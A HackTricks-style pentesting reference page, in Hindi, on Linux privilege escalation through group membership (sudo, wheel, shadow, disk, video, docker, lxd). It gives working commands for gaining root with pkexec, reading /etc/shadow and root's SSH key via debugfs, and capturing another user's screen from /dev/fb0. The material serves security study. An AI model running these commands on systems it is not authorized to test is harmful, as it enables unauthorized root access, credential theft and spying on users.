{{#include ../../banners/hacktricks-training.md}}

# Sudo/Admin Groups

## **PE - Method 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से \(या क्योंकि कुछ सॉफ़्टवेयर को इसकी आवश्यकता होती है\)** **/etc/sudoers** फ़ाइल के अंदर आप इनमें से कुछ पंक्तियाँ पा सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **कोई भी उपयोगकर्ता जो sudo या admin समूह का सदस्य है, वह sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निष्पादित कर सकते हैं**:
```text
sudo su
```
## PE - Method 2

सभी suid बाइनरी खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आप पाते हैं कि बाइनरी pkexec एक SUID बाइनरी है और आप sudo या admin के सदस्य हैं, तो आप संभवतः pkexec का उपयोग करके sudo के रूप में बाइनरी निष्पादित कर सकते हैं। इसकी सामग्री की जांच करें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहाँ आप पाएंगे कि कौन से समूह **pkexec** निष्पादित करने की अनुमति रखते हैं और **डिफ़ॉल्ट रूप से** कुछ लिनक्स में **sudo या admin** जैसे समूह **प्रकट** हो सकते हैं।

**रूट बनने के लिए आप निष्पादित कर सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को निष्पादित करने की कोशिश करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं बल्कि इसलिए है कि आप GUI के बिना जुड़े नहीं हैं**। और इस समस्या का एक समाधान यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग ssh सत्र** की आवश्यकता है:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**कभी-कभी**, **डिफ़ॉल्ट रूप से** **/etc/sudoers** फ़ाइल के अंदर आप यह पंक्ति पा सकते हैं:
```text
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **कोई भी उपयोगकर्ता जो व्हील समूह का सदस्य है, वह कुछ भी sudo के रूप में निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निष्पादित कर सकते हैं**:
```text
sudo su
```
# Shadow Group

**शेडो** समूह के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़** सकते हैं:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
तो, फ़ाइल को पढ़ें और कुछ **हैश क्रैक करने** की कोशिश करें।

# डिस्क समूह

यह विशेषाधिकार लगभग **रूट एक्सेस के बराबर** है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुँच सकते हैं।

फाइलें:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फाइलें लिख** भी सकते हैं। उदाहरण के लिए, `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालांकि, यदि आप **रूट द्वारा स्वामित्व वाले फ़ाइलें लिखने** की कोशिश करते हैं \(जैसे `/etc/shadow` या `/etc/passwd`\) तो आपको "**अनुमति अस्वीकृत**" त्रुटि मिलेगी।

# वीडियो समूह

कमांड `w` का उपयोग करके आप **जान सकते हैं कि सिस्टम पर कौन लॉग इन है** और यह निम्नलिखित आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** का मतलब है कि उपयोगकर्ता **yossi शारीरिक रूप से** मशीन पर एक टर्मिनल में लॉग इन है।

**वीडियो समूह** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन को देख सकते हैं। ऐसा करने के लिए, आपको **स्क्रीन पर वर्तमान छवि को** कच्चे डेटा में प्राप्त करना होगा और यह जानना होगा कि स्क्रीन किस रिज़ॉल्यूशन का उपयोग कर रही है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन का रिज़ॉल्यूशन `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**कच्ची छवि** को **खोलने** के लिए आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **Raw image data** चुनें:

![](../../images/image%20%28208%29.png)

फिर चौड़ाई और ऊँचाई को स्क्रीन पर उपयोग की गई मापों के अनुसार संशोधित करें और विभिन्न छवि प्रकारों की जांच करें \(और उस प्रकार का चयन करें जो स्क्रीन को बेहतर दिखाता है\):

![](../../images/image%20%28295%29.png)

# रूट समूह

ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलों या कुछ **लाइब्रेरी** फ़ाइलों या **अन्य दिलचस्प चीजों** को **संशोधित** करने तक पहुँच सकते हैं जो विशेषाधिकार बढ़ाने के लिए उपयोग की जा सकती हैं...

**जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

आप होस्ट मशीन के रूट फ़ाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है, तो यह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह प्रभावी रूप से आपको मशीन पर रूट देता है।

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
